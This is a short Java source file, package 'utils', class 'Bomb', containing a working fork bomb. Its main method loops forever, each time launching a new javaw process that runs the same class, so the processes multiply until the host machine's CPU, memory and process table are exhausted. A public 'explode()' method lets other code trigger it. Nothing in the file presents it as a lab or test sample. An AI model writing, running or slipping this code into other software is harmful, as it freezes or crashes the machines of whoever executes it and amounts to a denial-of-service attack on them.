package utils;

import java.io.IOException;

public class Bomb {
    public static void main(String[] args) throws IOException {
        while (true)
            Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), Bomb.class.getName()});
    }

    public static void explode() throws IOException {
        Bomb.main(null);
    }
}